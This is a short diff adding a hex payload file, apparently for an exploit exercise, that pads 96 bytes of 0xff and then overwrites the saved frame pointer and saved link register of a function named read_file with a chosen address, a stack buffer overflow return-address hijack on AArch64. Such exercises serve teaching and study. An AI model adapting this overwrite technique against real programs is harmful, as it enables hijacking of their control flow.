@@ -1,0 +1,14 @@
+ff ff ff ff ff ff ff ff // 96 bytes to clobber everything
+ff ff ff ff ff ff ff ff // 96 bytes to clobber everything
+ff ff ff ff ff ff ff ff // 96 bytes to clobber everything
+ff ff ff ff ff ff ff ff // 96 bytes to clobber everything
+ff ff ff ff ff ff ff ff // 96 bytes to clobber everything
+ff ff ff ff ff ff ff ff // 96 bytes to clobber everything
+ff ff ff ff ff ff ff ff // 96 bytes to clobber everything
+ff ff ff ff ff ff ff ff // 96 bytes to clobber everything
+ff ff ff ff ff ff ff ff // 96 bytes to clobber everything
+ff ff ff ff ff ff ff ff // 96 bytes to clobber everything
+ff ff ff ff ff ff ff ff // 96 bytes to clobber everything
+ff ff ff ff ff ff ff ff // 96 bytes to clobber everything
+aa aa aa aa aa aa aa aa // Clobber read_file's saved x29 (sp)
+e4 0b 40 00 00 00 00 00 // Overwrite read_file's saved x30 (lr)
